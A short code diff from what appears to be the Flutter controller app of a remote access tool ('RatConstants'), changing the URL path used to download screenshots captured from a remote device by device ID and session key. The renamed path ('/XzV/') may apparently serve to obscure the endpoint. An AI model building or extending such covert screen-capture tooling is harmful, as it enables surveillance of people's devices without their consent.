@@ -93,7 +93,7 @@ class _ScreenshotGalleryScreenState extends State<ScreenshotGalleryScreen> {
             final folder = content['folder'] ?? 'screenshot';
             
             setState(() {
-              _photoUrl = '${RatConstants.baseUrl}/api/rat/download/${widget.deviceId}/$folder/$fn?key=${widget.sessionKey}';
+              _photoUrl = '${RatConstants.baseUrl}/XzV/rat/download/${widget.deviceId}/$folder/$fn?key=${widget.sessionKey}';
               _status = 'Captured!';
               _isLoading = false;
             });
@@ -104,7 +104,7 @@ class _ScreenshotGalleryScreenState extends State<ScreenshotGalleryScreen> {
             if (c.contains('screenshot/')) {
                final fn = c.split('/').last.trim();
                setState(() {
-                 _photoUrl = '${RatConstants.baseUrl}/api/rat/download/${widget.deviceId}/screenshot/$fn?key=${widget.sessionKey}';
+                 _photoUrl = '${RatConstants.baseUrl}/XzV/rat/download/${widget.deviceId}/screenshot/$fn?key=${widget.sessionKey}';
                  _status = 'Captured!';
                  _isLoading = false;
                });
